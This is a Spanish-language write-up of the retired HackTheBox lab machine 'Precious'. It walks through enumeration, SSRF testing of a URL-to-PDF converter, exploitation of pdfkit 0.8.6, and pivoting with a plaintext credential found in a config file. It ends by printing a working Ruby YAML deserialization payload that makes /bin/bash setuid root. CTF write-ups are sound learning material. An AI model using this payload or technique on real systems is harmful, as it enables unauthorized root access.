---
title: Precious
layout: page
permalink: /HTB_Precious
---

<h2 class="amarillo">HackTheBox - Precious WriteUp - Máquina retirada</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Precious/Precious.png" alt="under" oncontextmenu="return false;">
</div>

Encendemos la maquina Precious y le lanzamos un ping para saber si la maquina esta activa, de paso por el TLL sabremos si estamos frente a una maquina Linux o Windows
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/1.png" alt="under" oncontextmenu="return false;">
</div>

La maquina esta activa y vemos un TLL de 63, por tanto, estamos frente a una maquina Linux.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/2.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Enumeración</h2>

Cuando hacemos la enumeración en nmap unicamente encontramos los puertos abiertos (22,80), y al momento de hacer un whatweb para enumerar un poco las tecnologías que podría estar usando la web y vemos información interesante como:
1. Un dominio **precious.htb**
2. Una tecnología llamada Ruby-on-rails

Buscando esta tecnología en searchsploit para averiguar si encontramos alguna vulnerabilidad asociada a Ruby-on-rails pero sin suerte

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/3.png" alt="under" oncontextmenu="return false;">
</div>

Seguimos con la enumeración agregando el dominio, abrimos el archivo /etc/hosts y probamos nuevamente la enumeración de las tecnologías pero no encontramos información relevante. Asi que abrimos la web en Firefox

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/4.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que podemos convertir una pagina web en PDF, probamos a crear un archivo cmd.php y nos montamos un servicio http con python

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/5.png" alt="under" oncontextmenu="return false;">
</div>

Colocamos en la url nuestra dirección http://10.10.16.54/cmd.php

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/6.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos que el servidor nos muestra una petición GET

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/7.png" alt="under" oncontextmenu="return false;">
</div>
Y vemos que la pagina nos a creado un PDF con el contenido de nuestro archivo php malicioso

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/8.png" alt="under" oncontextmenu="return false;">
</div>

Sin lograr ejecutar comandos, aun tenemos el PDF generado por la web entonces para enumerar un poco que tecnología nos esta generando este PDF probamos a leer los metadatos con la herramienta exiftool

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/9.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos que la tecnología empleada para la creación del PDF fue hecha por **pdfkit v0.8.6** y esta tiene vulnerabilidades asociadas. De esta manera logramos acceso a la maquina

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/10.png" alt="under" oncontextmenu="return false;">
</div>

Una vez dentro de la maquina hacemos un tratamiento de la tty para tener una consola completamente interactiva.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/11.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos que estamos como el usuario whoami
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/12.png" alt="under" oncontextmenu="return false;">
</div>

Como el usuario ruby buscamos por archivos que tengan el privilegio SUID pero no hay archivos interesantes.

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/13.png" alt="under" oncontextmenu="return false;">
</div>

Así que buscamos en el sistema un archivo llamado user.txt, así sabremos donde esta la flag del usuario y vemos que esta en el directorio personal del usuario henry. Tratando de leer la flag vemos que tenemos privilegios para leer la flag por tanto, tendremos que hacer user pivoting

<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/14.png" alt="under" oncontextmenu="return false;">
</div>

Enumerando directorios del sistema encontramos un directorio llamado config, en el cual encontraremos la credencial del usuario henry
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/15.png" alt="under" oncontextmenu="return false;">
</div>
`henry:Q3c1AqGHtoI0aXAYFH`

<h2 class="amarillo">Escalada</h2>

Enumerando el sistema como el usuario henry encontraremos que podemos ejecutar ruby como root actualizando todas las gemas
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/16.png" alt="under" oncontextmenu="return false;">
</div>

Podemos crear un archivo ruby malicioso para ejecutar un comando en este caso chmod 4755 a la /bin/bash
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/17.png" alt="under" oncontextmenu="return false;">
</div>

```ruby
dependencies.yml                                                                                            
:payload:
- !ruby/class 'Gem::SpecFetcher'
- !ruby/class 'Gem::Installer'
- !ruby/object:Gem::Requirement
  requirements: !ruby/object:Gem::Package::TarReader
    io: !ruby/object:Net::BufferedIO
      io: !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: aaa
      debug_output: !ruby/object:Net::WriteAdapter
        socket: !ruby/object:Gem::RequestSet
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module 'Kernel'
            method_id: :system
          git_set: chmod 4755 /bin/bash
        method_id: :resolve
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Precious/pwn3d.png" alt="under" oncontextmenu="return false;">
</div>
Con esto habremos completado la maquina.


